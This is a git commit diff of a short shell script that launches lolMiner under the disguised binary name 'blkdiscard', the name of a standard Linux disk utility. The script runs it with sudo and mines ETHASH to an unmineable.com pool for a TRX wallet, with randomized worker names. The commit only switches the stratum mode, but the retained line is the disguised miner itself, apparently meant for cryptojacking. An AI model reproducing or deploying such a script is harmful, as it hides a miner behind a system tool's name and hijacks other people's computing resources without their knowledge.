97e467d2b7e8fc77befc905dfba0b4856c20cd20
emmiras <94622205+emmiras@users.noreply.github.com>
2021-11-21 07:01:08 +0000

    Update y3n1.sh

--- y3n1.sh
+++ y3n1.sh
@@ -2,5 +2,5 @@
 
 cd "$(dirname "$0")"
 
-chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUVKgSFJWkYn4UBPjX1xPzxADUFGk3McXo.$(echo $(shuf -i 1-1000 -n 1)-joa) --ethstratum ETHPROXY
+chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TUVKgSFJWkYn4UBPjX1xPzxADUFGk3McXo.$(echo $(shuf -i 1-1000 -n 1)-joa) --ethstratum ETHV1
 pause
